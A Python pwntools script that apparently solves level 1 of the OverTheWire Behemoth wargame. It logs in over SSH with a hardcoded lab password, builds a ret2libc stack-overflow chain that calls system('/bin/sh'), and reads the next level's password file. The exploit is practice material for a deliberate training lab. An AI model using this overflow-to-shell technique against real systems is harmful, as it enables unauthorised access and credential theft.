#!/usr/bin/python3
from pwn import *
import os

OVERFLOW = 71

context.arch = 'i386'

level = 1
USER = 'behemoth%s' % level
HOST = 'behemoth.labs.overthewire.org'
PASS = 'aesebootiv'
PORT = 2221

log.info("Attempting to connect to " + USER + "@" + HOST + " on port " + str(PORT) + "...")
sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
log.success("Success connecting...")
log.info("Downloading binary and libc file for " + USER + "...")

#Download libc used for behemoth to find symbols
sh.download_file('/behemoth/%s' % USER)
sh.download_file('/lib32/libc.so.6', local="libc")
binary = ELF("behemoth1")
libc = ELF("libc")

#Found using 'ldd behemoth1'
libc.address = 0xf7e12000

rop = ROP(binary)
rop.raw('A' * OVERFLOW)
rop.raw(libc.symbols['system'])
rop.raw('AAAA')
rop.raw(next(libc.search(b'/bin/sh')))

log.info("Executing behemoth1")
io = sh.run('/behemoth/' + USER)
io.sendline(rop.chain())
io.sendline("cat /etc/behemoth_pass/behemoth%s" % (level+1) + "; exit")
io.recvline()
io.recvline()
log.success("behemoth%s " % (level+1) + " pass: " + io.recvline().decode("utf-8"))
os.remove("libc")
